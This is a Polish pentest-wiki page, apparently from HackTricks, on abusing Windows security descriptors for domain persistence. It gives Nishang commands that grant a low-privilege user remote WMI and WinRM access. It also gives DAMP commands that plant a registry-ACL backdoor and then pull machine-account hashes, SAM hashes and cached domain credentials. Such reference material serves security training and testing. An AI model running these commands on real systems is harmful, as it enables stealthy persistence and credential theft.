# Deskryptory zabezpieczeń

{{#include ../../banners/hacktricks-training.md}}

## Deskryptory zabezpieczeń

Deskryptory zabezpieczeń systemu Windows zawierają identyfikator SID właściciela, identyfikator SID grupy podstawowej, uznaniową listę kontroli dostępu (DACL), która kontroluje dostęp, oraz systemową listę kontroli dostępu (SACL), używaną głównie do audytowania. Security Descriptor Definition Language (SDDL) to reprezentacja tekstowa; ciąg ACE ma postać `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Deskryptor zabezpieczeń przechowuje informacje o tym, kto jest właścicielem obiektu możliwego do zabezpieczenia oraz którym podmiotom zezwolono na określone prawa do niego lub ich odmówiono. Jeśli atakujący może zmienić DACL, może nadać podmiotowi o niskich uprawnieniach prawa, które normalnie wymagają roli administracyjnej.

Dzięki temu wąsko zmodyfikowane deskryptory mogą być przydatne do persistence: konto pozostaje poza oczywistymi uprzywilejowanymi grupami, zachowując jednocześnie dostęp do określonej powierzchni zarządzania. Przed testowaniem zachowaj oryginalny deskryptor, aby można było dokładnie usunąć zmianę.

### Dostęp do WMI

Możesz nadać użytkownikowi dostęp do **zdalnego wykonywania WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Dostęp do WinRM

Przyznaj użytkownikowi dostęp do zdalnego endpointu PowerShell/WinRM za pomocą funkcji `Set-RemotePSRemoting` z Nishang:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Zdalny dostęp do hashy

DAMP może utworzyć backdoor registry-ACL, który później umożliwia zdalne pobieranie hasha konta komputera, hashy lokalnego SAM oraz zapisanych w pamięci podręcznej poświadczeń domenowych. Przyznanie tych ograniczonych uprawnień zwykłemu kontu — szczególnie w przypadku kontrolera domeny — zapewnia skuteczną persistence bez członkostwa w uprzywilejowanej grupie.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak można wykorzystać hash konta komputera kontrolera domeny.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
